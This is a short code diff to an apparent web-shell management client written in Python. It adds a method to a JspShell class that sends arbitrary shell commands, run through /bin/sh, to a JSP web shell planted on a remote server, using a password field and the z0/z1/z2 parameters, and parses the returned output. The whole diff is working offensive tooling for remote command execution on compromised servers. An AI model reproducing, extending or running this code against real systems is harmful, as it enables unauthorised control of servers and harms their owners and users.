@@ -59,3 +59,9 @@ class JspShell:
         payload = {self.shellEntity.shell_password: 'C', 'z1': path,'z0':self.shellEntity.shell_encode_type}
         response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
         return self.parseResponse(response)
+
+    def excuteCommand(self,path,command):
+        z2='{0};{1};echo [S];pwd;echo [E]'.format(path,command)
+        payload = {self.shellEntity.shell_password: 'M', 'z1': '-c/bin/sh','z2':z2, 'z0': self.shellEntity.shell_encode_type}
+        response = requests.post(self.shellEntity.shell_address, headers=self.httpHeaders, data=payload)
+        return self.parseResponse(response)
